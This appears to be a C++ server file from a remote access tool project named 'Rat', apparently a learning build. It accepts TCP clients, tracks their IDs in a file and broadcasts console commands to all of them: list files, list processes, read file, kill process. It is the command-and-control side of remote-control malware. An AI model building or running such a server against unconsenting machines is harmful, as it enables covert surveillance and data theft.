#include "Server.hpp"
#include <iostream>
#include <thread>
#include <openssl/evp.h>
#include <iomanip>
#include <sstream>
#include <random>
#include <fstream>

namespace Rat 
{
    std::string md5HashString(const std::string& input) {
        unsigned char md_value[EVP_MAX_MD_SIZE];
        unsigned int md_len = 0;

        EVP_MD_CTX* mdctx = EVP_MD_CTX_new();
        EVP_DigestInit_ex(mdctx, EVP_md5(), nullptr);
        EVP_DigestUpdate(mdctx, input.data(), input.size());
        EVP_DigestFinal_ex(mdctx, md_value, &md_len);
        EVP_MD_CTX_free(mdctx);

        std::stringstream ss;
        for (unsigned int i = 0; i < md_len; ++i)
            ss << std::hex << std::setw(2) << std::setfill('0') << (int)md_value[i];
        return ss.str();
    }

    // Hàm tạo dữ liệu ngẫu nhiên
    std::string generateRandomData(size_t length) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(33, 126); // Ký tự in được (ASCII 33-126)
        std::string data;
        for (size_t i = 0; i < length; ++i) {
            data += static_cast<char>(dis(gen));
        }
        return data;
    }

    Server::Server(uint16_t port)
        : acceptor_(io_context_, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), port)) 
        {}

    Server::~Server() 
    {
        stop();
    }

    void Server::start() 
    {
        initListClientID();
        acceptConnections();
        input_thread_ = std::thread(&Server::handleUserInput, this);
        io_context_.run();
    }

    void Server::stop() 
    {
        io_context_.stop();
        {
            std::lock_guard<std::mutex> lock(client_mutex_);
            clients_.clear();
        }
        {
            std::lock_guard<std::mutex> lock(client_id_mutex_);
            client_id_.clear();
        }
        if (input_thread_.joinable()) 
        {
            input_thread_.join();
        }
    }
    void Server::initListClientID(const std::string &path)
    {
        std::fstream file_config(path, std::ios::in | std::ios::out | std::ios::app);
        if(!file_config.is_open())
        {
            std::cout << "Open file not success!\n" << std::endl;
            return;
        }
        std::string client_id;
        while(std::getline(file_config, client_id)) 
        {
            try 
            {
                uint64_t number_client_id = std::stol(client_id);
                // std::cout <<  "Debug: " << number_client_id << std::endl;
                client_id_.insert(number_client_id);
            } 
            catch (const std::invalid_argument& e) 
            {
                std::cout << "ERROR: Invalid number!\n";
            } 
            catch (const std::out_of_range& e) 
            {
                std::cout << "ERROR: Out of range number!\n";
            }   
        }
        file_config.close();
    }

    void Server::acceptConnections() 
    {
        auto socket = std::make_shared<boost::asio::ip::tcp::socket>(io_context_);
        acceptor_.async_accept(*socket,
            [this, socket](const boost::system::error_code& ec) 
            {
                if (!ec) 
                {
                    addClient(socket);
                    std::string client_id = std::to_string(socket->native_handle());
                    std::cout << "New client connected: " << socket->remote_endpoint().address().to_string() + "_" + md5HashString(client_id) << std::endl;
                    handleClient(socket);
                } 
                else 
                {
                    std::cout << "Accept error: " << ec.message() << std::endl;
                }
                boost::asio::post(io_context_, [this]() { acceptConnections(); });
            });
    }

    void Server::handleClient(std::shared_ptr<boost::asio::ip::tcp::socket> client) 
    {
        networkManager_.receive(client,
            [this, client](const rat::Packet& packet, const boost::system::error_code& ec) 
            {
                if (ec) 
                {
                    std::cout << "Client error: " << ec.message() << std::endl;
                    removeClient(client);
                    return;
                }
                if (packet.has_chunked_data() && !packet.chunked_data().payload().empty()) 
                {
                    // std::cout << "Debug STATIC_ID: " << packet.destination_id() << " " << packet.source_id() << " " << packet.chunked_data().payload() << std::endl;
                    // set id for client 
                    
                    if (packet.type() == rat::Packet::STATIC_ID) 
                    {
                        uint64_t source_id = -1;
                        source_id = parseStaticIdPayload(packet.chunked_data().payload());
                        
                        bool client_exists = false;
                        {
                            std::lock_guard<std::mutex> lock(client_id_mutex_);
                            auto exist_client = client_id_.find(source_id);
                            client_exists = (exist_client != client_id_.end());
                        }
                        if (client_exists) {
                            updateClientWithExistingId(client, source_id);
                        } else {
                            assignNewClientId(client, source_id);
                            saveClientIdsToFile(source_id);
                        }
                        
                       
                    }
                    std::lock_guard<std::mutex> lock(client_mutex_);
                    auto it = clients_.find(client);
                    if (it == clients_.end()) {
                        std::cout << "Lỗi: Client is not existing\n";
                        return;
                    }
                    std::string client_id = std::to_string(it->second);
                    std::cout << "Client (" << client->remote_endpoint().address().to_string() + "_" + client_id << "): "
                            << packet.chunked_data().payload() << std::endl;
                } 
                else if (packet.has_chunked_data() && !packet.chunked_data().payload().size()) 
                {
                    std::cout << "Error from client: " << std::endl;
                }
                boost::asio::post(io_context_, [this, client]() { handleClient(client); });
            });
    }

    void Server::sendCommandToClient(std::shared_ptr<boost::asio::ip::tcp::socket> client, const rat::Packet& packet) 
    {
        networkManager_.send(client, packet,
            [](const boost::system::error_code& ec) 
            {
                if (ec) 
                {
                    std::cout << "Send error: " << ec.message() << std::endl;
                }
            });
    }

    void Server::handleUserInput() 
    {
        std::string input_type;
        std::cout << "Enter packet type (LIST_FILES, LIST_PROCESSES, READ_FILE, KILL_PROCESS): ";
        while (std::getline(std::cin, input_type)) 
        {
            if (input_type.empty()) continue;

            rat::Packet packet;
            packet.set_packet_id("server_" + std::to_string(std::rand()));
            packet.set_source_id("server");
            packet.set_destination_id("all_clients");

            // Gán loại packet dựa trên input
            if (input_type == "LIST_FILES") {
                packet.set_type(rat::Packet::LIST_FILES);
            } else if (input_type == "LIST_PROCESSES") {
                packet.set_type(rat::Packet::LIST_PROCESSES);
            } else if (input_type == "READ_FILE") {
                packet.set_type(rat::Packet::READ_FILE);
            } else if (input_type == "KILL_PROCESS") {
                packet.set_type(rat::Packet::KILL_PROCESS);
            } else {
                std::cout << "Unknown type, use: LIST_FILES, LIST_PROCESSES, READ_FILE, KILL_PROCESS" << std::endl;
                std::cout << "Enter packet type: ";
                continue;
            }

            // Tạo dữ liệu ngẫu nhiên cho command
            auto* command = packet.mutable_chunked_data();
            std::string random_data = generateRandomData(10); // Dữ liệu 10 ký tự ngẫu nhiên
            command->set_payload(random_data);

            for (auto& client : clients_) 
            {
                sendCommandToClient(client.first, packet);
            }
            std::cout << "Server sent: Type=" << input_type << ", Data=" << random_data << std::endl;
            std::cout << "Enter packet type: ";
        }
    }

    void Server::addClient(std::shared_ptr<boost::asio::ip::tcp::socket> client, uint64_t client_id)
    {
        std::lock_guard<std::mutex> lock(client_mutex_);
        if (clients_.size() >= MAX_CLIENT) {
            std::cout << "Error: Maximum client limit reached!\n";
            client->close();
            return;
        }
        clients_.insert({client, client_id});
    }
    void Server::removeClient(std::shared_ptr<boost::asio::ip::tcp::socket> client) 
    {
        std::lock_guard<std::mutex> lock(client_mutex_);
        clients_.erase(client);
    }

    uint64_t Server::parseStaticIdPayload(const std::string& payload) 
    {
        try {
            return std::stol(payload);
        } 
        catch (const std::invalid_argument& e) {
            std::cout << "ERROR: Invalid number!\n";
            return -1;
        }
        catch (const std::out_of_range& e) {
            std::cout << "ERROR: Out of range number!\n";
            return -1;
        }   
    }
    void Server::updateClientWithExistingId(std::shared_ptr<boost::asio::ip::tcp::socket> client, uint64_t source_id) 
    {
        std::lock_guard<std::mutex> lock(client_mutex_);
        if (clients_.find(client) != clients_.end()) {
            std::cout << "Client is existing, update ID: {}" << source_id << std::endl;
            clients_[client] = source_id; 
        } else {
            clients_.insert({client, source_id});
        }
    }
    void Server::assignNewClientId(std::shared_ptr<boost::asio::ip::tcp::socket> client, uint64_t& source_id) 
    {
        {
            std::lock_guard<std::mutex> lock(client_id_mutex_);
            if (client_id_.empty()) 
            {
                source_id = 0;
            } 
            else 
            {
                source_id = *client_id_.rbegin() + 1;
            }
            client_id_.insert(source_id);
        }

        rat::Packet response;
        response.set_type(rat::Packet::STATIC_ID);
        response.set_packet_id("server_0_" + std::to_string(std::rand()));
        response.set_source_id("server_0");
        response.set_destination_id("client_" + std::to_string(source_id));
        response.set_encrypted(false);

        auto* chunked = response.mutable_chunked_data();
        chunked->set_data_id("STATIC_ID_" + std::to_string(std::rand()));
        chunked->set_sequence_number(0);
        chunked->set_total_chunks(1);
        chunked->set_payload(std::to_string(source_id));
        chunked->set_success(true);
        chunked->set_error_message("");

        sendCommandToClient(client, response);

        {
            std::lock_guard<std::mutex> lock(client_mutex_);
            clients_.insert({client, source_id});
        }
    }
    void Server::saveClientIdsToFile(const uint64_t &source_id, const std::string &file_path)
    {
        boost::asio::post(io_context_, [this, source_id, file_path]() {
            std::lock_guard<std::mutex> lock(file_save_mutex);
            std::ofstream file_config(file_path, std::ios::app);
            if (!file_config.is_open()) {
                std::cout << "ERROR: Not open file success!\n" << file_path << std::endl;
                return;
            }
            file_config << source_id << "\n";
            if (file_config.fail()) {
                std::cout << "ERROR: Not write file success!\n" << file_path << std::endl;
                file_config.close();
                return;
            }
            file_config.close();
        });
    }
} // namespace Rat